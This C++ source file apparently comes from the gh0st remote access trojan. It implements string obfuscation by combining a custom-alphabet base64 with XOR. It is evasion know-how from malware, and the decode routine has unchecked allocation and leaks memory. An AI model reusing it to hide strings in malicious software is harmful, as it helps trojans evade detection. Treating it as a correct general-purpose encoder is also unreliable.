// EnDeCode.cpp: implementation of the EnDeCode class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "gh0st.h"
#include "EnDeCode.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

EnDeCode::EnDeCode()
{

}

EnDeCode::~EnDeCode()
{

}

int EnDeCode::base64_encode2(const void *data, int size, char **str)
{
	char *s, *p;
	int i;
	int c;
	const unsigned char *q;

	p = s = (char*)malloc(size*4/3+4);
	if (p == NULL)
		return -1;
	q = (const unsigned char*)data;
	i=0;
	for(i = 0; i < size;){
		c=q[i++];
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		c*=256;
		if(i < size)
			c+=q[i];
		i++;
		p[0]=base642[(c&0x00fc0000) >> 18];
		p[1]=base642[(c&0x0003f000) >> 12];
		p[2]=base642[(c&0x00000fc0) >> 6];
		p[3]=base642[(c&0x0000003f) >> 0];
		if(i > size)
			p[3]='=';
		if(i > size+1)
			p[2]='=';
		p+=4;
	}
	*p=0;
	*str = s;
	return lstrlenA(s);
}

char* EnDeCode::Encode(char *str)
{
	int		i, len;
	char	*p;
	char	*s, *data;
	len = lstrlenA(str) + 1;
	s = (char *)malloc(len);
	memcpy(s, str, len);
	for (i = 0; i < len; i++)
	{
		s[i] ^= 0x04;
	}
	base64_encode2(s, len, &data);
	free(s);
	return data;
}

static int pos(char c)
{
	char *p;
	for(p = base642; *p; p++)
		if(*p == c)
			return p - base642;
		return -1;
}

int EnDeCode::base64_decode2(const char *str, char **data)
{
	const char *s, *p;
	unsigned char *q;
	int c;
	int x;
	int done = 0;
	int len;
	s = (const char *)malloc(lstrlenA(str));
	q = (unsigned char *)s;
	for(p=str; *p && !done; p+=4){
		x = pos(p[0]);
		if(x >= 0)
			c = x;
		else{
			done = 3;
			break;
		}
		c*=64;
		
		x = pos(p[1]);
		if(x >= 0)
			c += x;
		else
			return -1;
		c*=64;
		
		if(p[2] == '=')
			done++;
		else{
			x = pos(p[2]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		c*=64;
		
		if(p[3] == '=')
			done++;
		else{
			if(done)
				return -1;
			x = pos(p[3]);
			if(x >= 0)
				c += x;
			else
				return -1;
		}
		if(done < 3)
			*q++=(c&0x00ff0000)>>16;
		
		if(done < 2)
			*q++=(c&0x0000ff00)>>8;
		if(done < 1)
			*q++=(c&0x000000ff)>>0;
	}
	
	len = q - (unsigned char*)(s);
	
	*data = (char*)realloc((void *)s, len);
	
	return len;
}

char* EnDeCode::Decode(char *str)
{
	int		i, len;
	char	*data = NULL;
	len = base64_decode2(str, &data);
	
	for (i = 0; i < len; i++)
	{
		data[i] ^= 0x04;
	}
	return data;
}

char* EnDeCode::encrypt(char* str)//¼ÓÃÜ
{
	char* p = str;
	int i = 0;
	while(*p != '\0') *p++ ^= i++;
	return str;
}

char* EnDeCode::decrypt(char* str)//½âÃÜ
{
	char* p = str;
	int i = 0;
	while(*p != '\0') *p++ ^= i++;
	return str;
}